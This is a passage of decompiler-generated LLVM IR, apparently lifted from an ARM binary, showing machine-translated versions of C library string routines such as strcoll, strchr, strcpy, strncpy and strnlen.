  %v4_117fc = load i32, i32* %r3.global-to-local, align 4
  %v5_117fc = add i32 %v4_117fc, 1
  store i32 %v5_117fc, i32* %r3.global-to-local, align 4
  %v0_11800 = load i32, i32* %r1.global-to-local, align 4
  %v1_11800 = trunc i32 %v0_11800 to i8
  %v3_11800 = inttoptr i32 %v5_117fc to i8*
  store i8 %v1_11800, i8* %v3_11800, align 1
  %v4_11800 = load i32, i32* %r3.global-to-local, align 4
  %v5_11800 = add i32 %v4_11800, 1
  store i32 %v5_11800, i32* %r3.global-to-local, align 4
  %v0_11804 = load i32, i32* %r1.global-to-local, align 4
  %v1_11804 = trunc i32 %v0_11804 to i8
  %v3_11804 = inttoptr i32 %v5_11800 to i8*
  store i8 %v1_11804, i8* %v3_11804, align 1
  %v4_11804 = load i32, i32* %r3.global-to-local, align 4
  %v5_11804 = add i32 %v4_11804, 1
  store i32 %v5_11804, i32* %r3.global-to-local, align 4
  %v0_11808 = load i32, i32* %r1.global-to-local, align 4
  %v1_11808 = trunc i32 %v0_11808 to i8
  %v3_11808 = inttoptr i32 %v5_11804 to i8*
  store i8 %v1_11808, i8* %v3_11808, align 1
  %v4_11808 = load i32, i32* %r3.global-to-local, align 4
  %v5_11808 = add i32 %v4_11808, 1
  store i32 %v5_11808, i32* %r3.global-to-local, align 4
  %v0_1180c = load i32, i32* %r1.global-to-local, align 4
  %v1_1180c = trunc i32 %v0_1180c to i8
  %v3_1180c = inttoptr i32 %v5_11808 to i8*
  store i8 %v1_1180c, i8* %v3_1180c, align 1
  %v4_1180c = load i32, i32* %r3.global-to-local, align 4
  %v5_1180c = add i32 %v4_1180c, 1
  store i32 %v5_1180c, i32* %r3.global-to-local, align 4
  %v0_11810 = load i32, i32* %r1.global-to-local, align 4
  %v1_11810 = trunc i32 %v0_11810 to i8
  %v3_11810 = inttoptr i32 %v5_1180c to i8*
  store i8 %v1_11810, i8* %v3_11810, align 1
  %v4_11810 = load i32, i32* %r3.global-to-local, align 4
  %v5_11810 = add i32 %v4_11810, 1
  store i32 %v5_11810, i32* %r3.global-to-local, align 4
  %v0_11814 = load i32, i32* %r1.global-to-local, align 4
  %v1_11814 = trunc i32 %v0_11814 to i8
  %v3_11814 = inttoptr i32 %v5_11810 to i8*
  store i8 %v1_11814, i8* %v3_11814, align 1
  %v4_11814 = load i32, i32* %r3.global-to-local, align 4
  %v5_11814 = add i32 %v4_11814, 1
  store i32 %v5_11814, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_117b0, { 1, 0 }
  uselistorder i32 %v12_117dc, { 1, 2, 0 }
  uselistorder i32 %v0_117b054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_117a8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11798, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1178c, { 1, 0 }
  uselistorder i32 %v0_11784, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 21, 17, 14, 15, 16, 13, 18, 20, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 13, 9, 10, 11, 12, 8, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 5, 2, 0, 8, 7, 1, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_117e8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_117c0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_11824.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_11824 = phi i32 [ %v0_11824.pre, %bb ], [ %v5_11824, %bb3 ]
  %v0_11820 = phi i32 [ %tmp, %bb ], [ %v5_11820, %bb3 ]
  %v1_11820 = inttoptr i32 %v0_11820 to i8*
  %v2_11820 = load i8, i8* %v1_11820, align 1
  %v3_11820 = zext i8 %v2_11820 to i32
  store i32 %v3_11820, i32* @r2, align 4
  %v1_11824 = inttoptr i32 %v0_11824 to i8*
  %v2_11824 = load i8, i8* %v1_11824, align 1
  %v3_11824 = zext i8 %v2_11824 to i32
  %v2_11828 = icmp eq i8 %v2_11820, 0
  br i1 %v2_11828, label %.dec_label_pc_11834_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_11824 = add i32 %v0_11824, 1
  %v5_11820 = add i32 %v0_11820, 1
  %v10_1182c = icmp eq i8 %v2_11820, %v2_11824
  br i1 %v10_1182c, label %entry, label %dec_label_pc_11834

.dec_label_pc_11834_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_11834

dec_label_pc_11834:                               ; preds = %bb3, %.dec_label_pc_11834_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_11834_crit_edge ], [ %v3_11820, %bb3 ]
  %v2_11834.pre-phi = sub nsw i32 %.pn, %v3_11824
  ret i32 %v2_11834.pre-phi

; uselistorder directives
  uselistorder i32 %v0_11820, { 1, 0 }
  uselistorder i32 %v0_11824, { 1, 0 }
  uselistorder label %dec_label_pc_11834, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_118a0 = load i32, i32* @r5, align 4
  %v9_118a0 = load i32, i32* @r6, align 4
  %v1_118a4 = urem i32 %arg1, 256
  br label %dec_label_pc_118c4

dec_label_pc_118ac:                               ; preds = %dec_label_pc_118c4
  %v3_118ac = load i8, i8* %.0, align 1
  %v4_118ac = zext i8 %v3_118ac to i32
  %v9_118b0 = icmp eq i32 %v4_118ac, %v1_118a4
  br i1 %v9_118b0, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_118ac
  ret i32 %v1_118c4

bb24:                                             ; preds = %dec_label_pc_118ac
  %v2_118b8 = icmp eq i8 %v3_118ac, 0
  %v2_118bc = add i32 %v1_118c4, 1
  %v3_118bc = inttoptr i32 %v2_118bc to i8*
  br i1 %v2_118b8, label %dec_label_pc_11998, label %dec_label_pc_118c4

dec_label_pc_118c4:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_118bc, %bb24 ]
  %v1_118c4 = ptrtoint i8* %.0 to i32
  %v2_118c4 = urem i32 %v1_118c4, 4
  %v3_118c4 = icmp eq i32 %v2_118c4, 0
  br i1 %v3_118c4, label %dec_label_pc_118cc, label %dec_label_pc_118ac

dec_label_pc_118cc:                               ; preds = %dec_label_pc_118c4
  %v4_118cc = mul nuw nsw i32 %v1_118a4, 256
  %v5_118cc = or i32 %v4_118cc, %v1_118a4
  %v4_118d4 = mul i32 %v5_118cc, 65536
  %v5_118d4 = or i32 %v4_118d4, %v5_118cc
  br label %dec_label_pc_118d8

dec_label_pc_118d8:                               ; preds = %dec_label_pc_11990, %dec_label_pc_11918, %dec_label_pc_118cc
  %v0_1193c = phi i32 [ %v1_118c4, %dec_label_pc_118cc ], [ %v4_118d8, %dec_label_pc_11918 ], [ %v4_118d8, %dec_label_pc_11990 ]
  %v1_118d8 = inttoptr i32 %v0_1193c to i32*
  %v2_118d8 = load i32, i32* %v1_118d8, align 4
  %v4_118d8 = add i32 %v0_1193c, 4
  %v2_118e0 = xor i32 %v2_118d8, %v5_118d4
  %v2_118ec = add i32 %v2_118d8, 2130640639
  %v1_118f0 = sub i32 -1, %v2_118d8
  %v2_118f4 = xor i32 %v2_118ec, %v1_118f0
  %v2_118f8 = add i32 %v2_118e0, 2130640639
  %v1_11900 = sub i32 -1, %v2_118e0
  %v2_11904 = and i32 %v2_118f4, -2130640640
  %v2_11908 = xor i32 %v2_118f8, %v1_11900
  %v2_1190c = icmp eq i32 %v2_11904, 0
  %v2_11910 = and i32 %v2_11908, -2130640640
  store i32 %v2_11910, i32* @lr, align 4
  br i1 %v2_1190c, label %dec_label_pc_11918, label %dec_label_pc_11920

dec_label_pc_11918:                               ; preds = %dec_label_pc_118d8
  %v2_11918 = icmp eq i32 %v2_11910, 0
  br i1 %v2_11918, label %dec_label_pc_118d8, label %dec_label_pc_11920

dec_label_pc_11920:                               ; preds = %dec_label_pc_118d8, %dec_label_pc_11918
  %v2_11920 = inttoptr i32 %v0_1193c to i8*
  %v3_11920 = load i8, i8* %v2_11920, align 1
  %v4_11920 = zext i8 %v3_11920 to i32
  %v1_11928 = add i32 %v0_1193c, 1
  %v1_1192c = add i32 %v0_1193c, 2
  %v9_11930 = icmp eq i32 %v4_11920, %v1_118a4
  %v1_11934 = add i32 %v0_1193c, 3
  store i32 %v1_11934, i32* @ip, align 4
  br i1 %v9_11930, label %dec_label_pc_1193c, label %dec_label_pc_11944

dec_label_pc_1193c:                               ; preds = %dec_label_pc_11920
  store i32 %v6_118a0, i32* @r5, align 4
  store i32 %v9_118a0, i32* @r6, align 4
  ret i32 %v0_1193c

dec_label_pc_11944:                               ; preds = %dec_label_pc_11920
  %v2_11944 = icmp eq i8 %v3_11920, 0
  br i1 %v2_11944, label %dec_label_pc_11998, label %dec_label_pc_1194c

dec_label_pc_1194c:                               ; preds = %dec_label_pc_11944
  %v2_1194c = inttoptr i32 %v1_11928 to i8*
  %v3_1194c = load i8, i8* %v2_1194c, align 1
  %v4_1194c = zext i8 %v3_1194c to i32
  %v9_11950 = icmp eq i32 %v4_1194c, %v1_118a4
  br i1 %v9_11950, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_1194c
  store i32 %v6_118a0, i32* @r5, align 4
  store i32 %v9_118a0, i32* @r6, align 4
  ret i32 %v1_11928

bb26:                                             ; preds = %dec_label_pc_1194c
  %v2_11958 = icmp eq i8 %v3_1194c, 0
  br i1 %v2_11958, label %dec_label_pc_11998, label %dec_label_pc_11960

dec_label_pc_11960:                               ; preds = %bb26
  %v2_11960 = inttoptr i32 %v1_1192c to i8*
  %v3_11960 = load i8, i8* %v2_11960, align 1
  %v4_11960 = zext i8 %v3_11960 to i32
  %v9_11964 = icmp eq i32 %v4_11960, %v1_118a4
  br i1 %v9_11964, label %dec_label_pc_1196c, label %dec_label_pc_11974

dec_label_pc_1196c:                               ; preds = %dec_label_pc_11960
  store i32 %v6_118a0, i32* @r5, align 4
  store i32 %v9_118a0, i32* @r6, align 4
  ret i32 %v1_1192c

dec_label_pc_11974:                               ; preds = %dec_label_pc_11960
  %v2_11974 = icmp eq i8 %v3_11960, 0
  br i1 %v2_11974, label %dec_label_pc_11998, label %dec_label_pc_1197c

dec_label_pc_1197c:                               ; preds = %dec_label_pc_11974
  %v2_1197c = inttoptr i32 %v1_11934 to i8*
  %v3_1197c = load i8, i8* %v2_1197c, align 1
  %v4_1197c = zext i8 %v3_1197c to i32
  %v9_11980 = icmp eq i32 %v4_1197c, %v1_118a4
  br i1 %v9_11980, label %dec_label_pc_11988, label %dec_label_pc_11990

dec_label_pc_11988:                               ; preds = %dec_label_pc_1197c
  store i32 %v6_118a0, i32* @r5, align 4
  store i32 %v9_118a0, i32* @r6, align 4
  ret i32 %v1_11934

dec_label_pc_11990:                               ; preds = %dec_label_pc_1197c
  %v2_11990 = icmp eq i8 %v3_1197c, 0
  br i1 %v2_11990, label %dec_label_pc_11998, label %dec_label_pc_118d8

dec_label_pc_11998:                               ; preds = %bb24, %dec_label_pc_11990, %dec_label_pc_11974, %bb26, %dec_label_pc_11944
  store i32 %v6_118a0, i32* @r5, align 4
  store i32 %v9_118a0, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_118d8, { 1, 0 }
  uselistorder i32 %v2_118d8, { 0, 2, 1 }
  uselistorder i32 %v0_1193c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_118cc, { 1, 0 }
  uselistorder i32 %v1_118c4, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_118a4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_118a0, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_118a0, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_11998, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_11920, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_119a8 = sub i32 %arg1, %tmp
  %v1_119ac = add i32 %v2_119a8, -1
  store i32 %v1_119ac, i32* %r2.global-to-local, align 4
  %v2_119b04 = load i8, i8* %arg2, align 1
  %v5_119b06 = add i32 %tmp, 1
  store i32 %v5_119b06, i32* %r1.global-to-local, align 4
  %v2_119b47 = icmp eq i8 %v2_119b04, 0
  store i1 %v2_119b47, i1* %cpsr_z.global-to-local, align 1
  %v5_119b88 = inttoptr i32 %arg1 to i8*
  store i8 %v2_119b04, i8* %v5_119b88, align 1
  %v0_119bc9 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_119bc9, label %dec_label_pc_119c0, label %dec_label_pc_119b0.dec_label_pc_119b0_crit_edge

dec_label_pc_119b0.dec_label_pc_119b0_crit_edge:  ; preds = %entry, %dec_label_pc_119b0.dec_label_pc_119b0_crit_edge
  %v0_119b0.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_119b8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_119b0 = inttoptr i32 %v0_119b0.pre to i8*
  %v2_119b0 = load i8, i8* %v1_119b0, align 1
  %v5_119b0 = add i32 %v0_119b0.pre, 1
  store i32 %v5_119b0, i32* %r1.global-to-local, align 4
  %v2_119b4 = icmp eq i8 %v2_119b0, 0
  store i1 %v2_119b4, i1* %cpsr_z.global-to-local, align 1
  %v4_119b8 = add i32 %v5_119b0, %v3_119b8.pre
  %v5_119b8 = inttoptr i32 %v4_119b8 to i8*
  store i8 %v2_119b0, i8* %v5_119b8, align 1
  %v0_119bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_119bc, label %dec_label_pc_119c0, label %dec_label_pc_119b0.dec_label_pc_119b0_crit_edge

dec_label_pc_119c0:                               ; preds = %dec_label_pc_119b0.dec_label_pc_119b0_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_119b0.dec_label_pc_119b0_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_119c4 = icmp eq i32 %arg2, 3
  store i1 %v7_119c4, i1* %cpsr_z.global-to-local, align 1
  %v1_119cc = add i32 %arg1, -1
  store i32 %v1_119cc, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_11a48, label %dec_label_pc_119d4

dec_label_pc_119d4:                               ; preds = %entry
  %v3_119d4 = udiv i32 %arg2, 4
  store i32 %v3_119d4, i32* @lr, align 4
  %v0_119d8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_119d8

dec_label_pc_119d8:                               ; preds = %dec_label_pc_11a24, %dec_label_pc_119d4
  %v2_119e0 = phi i32 [ %v6_11a18, %dec_label_pc_11a24 ], [ %v1_119cc, %dec_label_pc_119d4 ]
  %v0_119d8 = phi i32 [ %v1_11a28, %dec_label_pc_11a24 ], [ %v0_119d8.pre, %dec_label_pc_119d4 ]
  %v1_119d8 = inttoptr i32 %v0_119d8 to i8*
  %v2_119d8 = load i8, i8* %v1_119d8, align 1
  %v3_119d8 = zext i8 %v2_119d8 to i32
  store i32 %v3_119d8, i32* %r3.global-to-local, align 4
  %v2_119dc = icmp eq i8 %v2_119d8, 0
  store i1 %v2_119dc, i1* %cpsr_z.global-to-local, align 1
  %v3_119e0 = add i32 %v2_119e0, 1
  %v4_119e0 = inttoptr i32 %v3_119e0 to i8*
  store i8 %v2_119d8, i8* %v4_119e0, align 1
  %v5_119e0 = load i32, i32* @ip, align 4
  %v6_119e0 = add i32 %v5_119e0, 1
  store i32 %v6_119e0, i32* @ip, align 4
  %v0_119e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_119e4, label %dec_label_pc_11a34, label %dec_label_pc_119e8

dec_label_pc_119e8:                               ; preds = %dec_label_pc_119d8
  %v0_119e8 = load i32, i32* @r1, align 4
  %v1_119e8 = add i32 %v0_119e8, 1
  %v2_119e8 = inttoptr i32 %v1_119e8 to i8*
  %v3_119e8 = load i8, i8* %v2_119e8, align 1
  %v4_119e8 = zext i8 %v3_119e8 to i32
  store i32 %v4_119e8, i32* %r3.global-to-local, align 4
  %v2_119ec = icmp eq i8 %v3_119e8, 0
  store i1 %v2_119ec, i1* %cpsr_z.global-to-local, align 1
  %v3_119f0 = add i32 %v5_119e0, 2
  %v4_119f0 = inttoptr i32 %v3_119f0 to i8*
  store i8 %v3_119e8, i8* %v4_119f0, align 1
  %v5_119f0 = load i32, i32* @ip, align 4
  %v6_119f0 = add i32 %v5_119f0, 1
  store i32 %v6_119f0, i32* @ip, align 4
  %v0_119f4 = load i32, i32* @r1, align 4
  %v1_119f4 = add i32 %v0_119f4, 1
  store i32 %v1_119f4, i32* %r1.global-to-local, align 4
  %v0_119f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_119f8, label %dec_label_pc_11a34, label %dec_label_pc_119fc

dec_label_pc_119fc:                               ; preds = %dec_label_pc_119e8
  %v1_119fc = add i32 %v0_119f4, 2
  %v2_119fc = inttoptr i32 %v1_119fc to i8*
  %v3_119fc = load i8, i8* %v2_119fc, align 1
  %v4_119fc = zext i8 %v3_119fc to i32
  store i32 %v4_119fc, i32* %r3.global-to-local, align 4
  %v2_11a00 = icmp eq i8 %v3_119fc, 0
  store i1 %v2_11a00, i1* %cpsr_z.global-to-local, align 1
  %v3_11a04 = add i32 %v5_119f0, 2
  %v4_11a04 = inttoptr i32 %v3_11a04 to i8*
  store i8 %v3_119fc, i8* %v4_11a04, align 1
  %v5_11a04 = load i32, i32* @ip, align 4
  %v6_11a04 = add i32 %v5_11a04, 1
  store i32 %v6_11a04, i32* @ip, align 4
  %v0_11a08 = load i32, i32* %r1.global-to-local, align 4
  %v1_11a08 = add i32 %v0_11a08, 1
  store i32 %v1_11a08, i32* %r1.global-to-local, align 4
  %v0_11a0c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11a0c, label %dec_label_pc_11a34, label %dec_label_pc_11a10

dec_label_pc_11a10:                               ; preds = %dec_label_pc_119fc
  %v1_11a10 = add i32 %v0_11a08, 2
  %v2_11a10 = inttoptr i32 %v1_11a10 to i8*
  %v3_11a10 = load i8, i8* %v2_11a10, align 1
  %v4_11a10 = zext i8 %v3_11a10 to i32
  store i32 %v4_11a10, i32* %r3.global-to-local, align 4
  %v2_11a14 = icmp eq i8 %v3_11a10, 0
  store i1 %v2_11a14, i1* %cpsr_z.global-to-local, align 1
  %v3_11a18 = add i32 %v5_11a04, 2
  %v4_11a18 = inttoptr i32 %v3_11a18 to i8*
  store i8 %v3_11a10, i8* %v4_11a18, align 1
  %v5_11a18 = load i32, i32* @ip, align 4
  %v6_11a18 = add i32 %v5_11a18, 1
  store i32 %v6_11a18, i32* @ip, align 4
  %v0_11a1c = load i32, i32* %r1.global-to-local, align 4
  %v1_11a1c = add i32 %v0_11a1c, 1
  store i32 %v1_11a1c, i32* %r1.global-to-local, align 4
  %v0_11a20 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11a20, label %dec_label_pc_11a34, label %dec_label_pc_11a24

dec_label_pc_11a24:                               ; preds = %dec_label_pc_11a10
  %v0_11a24 = load i32, i32* @lr, align 4
  %v1_11a24 = add i32 %v0_11a24, -1
  store i32 %v1_11a24, i32* @lr, align 4
  %v7_11a24 = icmp eq i32 %v0_11a24, 1
  store i1 %v7_11a24, i1* %cpsr_z.global-to-local, align 1
  %v1_11a28 = add i32 %v0_11a1c, 2
  store i32 %v1_11a28, i32* @r1, align 4
  br i1 %v7_11a24, label %dec_label_pc_11a48, label %dec_label_pc_119d8

dec_label_pc_11a34:                               ; preds = %dec_label_pc_11a10, %dec_label_pc_119fc, %dec_label_pc_119e8, %dec_label_pc_119d8
  %v1_11a34 = phi i32 [ %v6_11a18, %dec_label_pc_11a10 ], [ %v6_11a04, %dec_label_pc_119fc ], [ %v6_119f0, %dec_label_pc_119e8 ], [ %v6_119e0, %dec_label_pc_119d8 ]
  %v2_11a341 = sub i32 %arg1, %v1_11a34
  %v2_11a38 = add i32 %v2_11a341, %arg2
  store i32 %v2_11a38, i32* %r3.global-to-local, align 4
  %v1_11a3c = add i32 %v2_11a38, -1
  store i32 %v1_11a3c, i32* %r2.global-to-local, align 4
  %v7_11a3c = icmp eq i32 %v2_11a38, 1
  store i1 %v7_11a3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a3c, label %bb, label %dec_label_pc_11a68

bb:                                               ; preds = %dec_label_pc_11a34
  ret i32 %arg1

dec_label_pc_11a48:                               ; preds = %dec_label_pc_11a24, %entry
  %v2_11a586 = phi i32 [ %v1_119cc, %entry ], [ %v6_11a18, %dec_label_pc_11a24 ]
  %v1_11a48 = urem i32 %arg2, 4
  store i32 %v1_11a48, i32* %r2.global-to-local, align 4
  %v2_11a48 = icmp eq i32 %v1_11a48, 0
  store i1 %v2_11a48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11a48, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_11a48
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_11a48, %._crit_edge
  %v2_11a58 = phi i32 [ %v6_11a58, %._crit_edge ], [ %v2_11a586, %dec_label_pc_11a48 ]
  %v0_11a54 = phi i32 [ %v0_11a54.pre, %._crit_edge ], [ %v1_11a48, %dec_label_pc_11a48 ]
  %v0_11a50 = load i32, i32* @r1, align 4
  %v1_11a50 = inttoptr i32 %v0_11a50 to i8*
  %v2_11a50 = load i8, i8* %v1_11a50, align 1
  %v3_11a50 = zext i8 %v2_11a50 to i32
  store i32 %v3_11a50, i32* %r3.global-to-local, align 4
  %v5_11a50 = add i32 %v0_11a50, 1
  store i32 %v5_11a50, i32* @r1, align 4
  %v1_11a54 = add i32 %v0_11a54, -1
  store i32 %v1_11a54, i32* %r2.global-to-local, align 4
  %v7_11a54 = icmp eq i32 %v0_11a54, 1
  store i1 %v7_11a54, i1* %cpsr_z.global-to-local, align 1
  %v3_11a58 = add i32 %v2_11a58, 1
  %v4_11a58 = inttoptr i32 %v3_11a58 to i8*
  store i8 %v2_11a50, i8* %v4_11a58, align 1
  %v5_11a58 = load i32, i32* @ip, align 4
  %v6_11a58 = add i32 %v5_11a58, 1
  store i32 %v6_11a58, i32* @ip, align 4
  %v0_11a5c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11a5c, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_11a60 = load i32, i32* %r3.global-to-local, align 4
  %v2_11a60 = icmp eq i32 %v0_11a60, 0
  store i1 %v2_11a60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11a60, label %dec_label_pc_11a68, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_11a54.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_11a68:                               ; preds = %dec_label_pc_11a34, %bb13, %dec_label_pc_11a68
  %v2_11a70 = phi i32 [ %v6_11a70, %dec_label_pc_11a68 ], [ %v1_11a34, %dec_label_pc_11a34 ], [ %v6_11a58, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11a6c = load i32, i32* %r2.global-to-local, align 4
  %v1_11a6c = add i32 %v0_11a6c, -1
  store i32 %v1_11a6c, i32* %r2.global-to-local, align 4
  %v7_11a6c = icmp eq i32 %v0_11a6c, 1
  store i1 %v7_11a6c, i1* %cpsr_z.global-to-local, align 1
  %v3_11a70 = add i32 %v2_11a70, 1
  %v4_11a70 = inttoptr i32 %v3_11a70 to i8*
  store i8 0, i8* %v4_11a70, align 1
  %v5_11a70 = load i32, i32* @ip, align 4
  %v6_11a70 = add i32 %v5_11a70, 1
  store i32 %v6_11a70, i32* @ip, align 4
  %v0_11a74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11a74, label %dec_label_pc_11a78, label %dec_label_pc_11a68

dec_label_pc_11a78:                               ; preds = %dec_label_pc_11a68
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_11a70, { 1, 0 }
  uselistorder i32 %v0_11a6c, { 1, 0 }
  uselistorder i32 %v6_11a58, { 0, 2, 1 }
  uselistorder i32 %v1_11a48, { 2, 1, 0 }
  uselistorder i32 %v2_11a38, { 2, 1, 0 }
  uselistorder i32 %v1_11a28, { 1, 0 }
  uselistorder i32 %v0_11a24, { 1, 0 }
  uselistorder i32 %v6_11a18, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 3, 1, 5, 2, 0, 4 }
  uselistorder label %dec_label_pc_11a68, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_11a7c = load i32, i32* @r1, align 4
  %v2_11a7c = icmp eq i32 %v0_11a7c, 0
  br i1 %v2_11a7c, label %bb, label %dec_label_pc_11aac

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_11a94:                               ; preds = %dec_label_pc_11abc
  %v3_11a94 = icmp uge i32 %v5_11b48, %v1_11a94
  %v9_11a94 = icmp eq i32 %v5_11b48, %v1_11a94
  %v2_11a98 = xor i1 %v3_11a94, true
  %v3_11a98 = or i1 %v9_11a94, %v2_11a98
  br i1 %v3_11a98, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_11a94
  %v6_11a98 = sub i32 %v5_11b48, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_11a94, %bb19
  %v5_11a9c = phi i32 [ %v1_11a94, %dec_label_pc_11a94 ], [ %v6_11a98, %bb19 ]
  %v2_11a9c = xor i1 %v9_11a94, true
  %v3_11a9c = and i1 %v3_11a94, %v2_11a9c
  br i1 %v3_11a9c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_11a9c = sub i32 %v5_11a9c, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_11aa0 = phi i32 [ %v5_11a9c, %bb20 ], [ %v6_11a9c, %bb21 ]
  ret i32 %v8_11aa0

dec_label_pc_11aa4:                               ; preds = %dec_label_pc_11af0
  br label %dec_label_pc_11b44

dec_label_pc_11aac:                               ; preds = %entry
  %v2_11aac = add i32 %tmp, %v0_11a7c
  %v3_11aac = icmp ult i32 %v2_11aac, %tmp
  br i1 %v3_11aac, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_11aac
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_11aac, %bb23
  %v5_11b48 = phi i32 [ %v2_11aac, %dec_label_pc_11aac ], [ -1, %bb23 ]
  %v1_11acc2 = urem i32 %tmp, 4
  %v2_11acc3 = icmp eq i32 %v1_11acc2, 0
  br i1 %v2_11acc3, label %dec_label_pc_11ad4, label %dec_label_pc_11abc

dec_label_pc_11abc:                               ; preds = %bb24, %dec_label_pc_11ac8
  %v1_11a94 = phi i32 [ %v1_11ac8, %dec_label_pc_11ac8 ], [ %tmp, %bb24 ]
  %v1_11abc = inttoptr i32 %v1_11a94 to i8*
  %v2_11abc = load i8, i8* %v1_11abc, align 1
  %v2_11ac0 = icmp eq i8 %v2_11abc, 0
  br i1 %v2_11ac0, label %dec_label_pc_11a94, label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11abc
  %v1_11ac8 = add i32 %v1_11a94, 1
  %v1_11acc = urem i32 %v1_11ac8, 4
  %v2_11acc = icmp eq i32 %v1_11acc, 0
  br i1 %v2_11acc, label %dec_label_pc_11ad4, label %dec_label_pc_11abc

dec_label_pc_11ad4:                               ; preds = %dec_label_pc_11ac8, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_11ac8, %dec_label_pc_11ac8 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_11b3432 = icmp ult i32 %storemerge.lcssa, %v5_11b48
  br i1 %v3_11b3432, label %dec_label_pc_11adc, label %dec_label_pc_11b44

dec_label_pc_11adc:                               ; preds = %dec_label_pc_11b30, %dec_label_pc_11ad4
  %v0_11aa439 = phi i32 [ %v4_11adc, %dec_label_pc_11b30 ], [ %storemerge.lcssa, %dec_label_pc_11ad4 ]
  %v1_11adc = inttoptr i32 %v0_11aa439 to i32*
